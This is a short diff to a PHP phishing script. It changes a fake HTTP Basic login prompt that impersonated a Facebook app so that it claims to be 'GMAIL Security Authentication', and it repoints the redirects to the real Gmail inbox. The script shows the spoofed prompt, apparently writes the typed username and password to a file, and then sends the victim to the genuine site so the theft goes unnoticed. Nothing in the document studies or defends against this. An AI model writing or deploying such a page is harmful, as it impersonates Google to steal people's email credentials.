@@ -1,14 +1,14 @@
 <?php
 if (empty($_SERVER['PHP_AUTH_USER'])) {
-    header('WWW-Authenticate: Basic realm="Facebook Application Security Authentication"');
+    header('WWW-Authenticate: Basic realm="GMAIL Security Authentication"');
     header('HTTP/1.0 401 Unauthorized');
    	echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <HTML>
 <HEAD>
-<TITLE>Facebook Application Security Authentication</TITLE>
+<TITLE>GMAIL Security Authentication</TITLE>
 <META 
      HTTP-EQUIV="Refresh"
-     CONTENT="1; URL=http://apps.facebook.com/restaurantcity/">
+     CONTENT="1; URL=https://mail.google.com/mail/">
 </HEAD>
 <BODY>
 <b>Authentication failed. Please try again</b>
@@ -31,6 +31,6 @@ if (empty($_SERVER['PHP_AUTH_USER'])) {
 	
 	fclose($fl);
 	
-    header("location: http://apps.facebook.com/restaurantcity/");
+    header("location: https://mail.google.com/mail/");
 }
 ?>
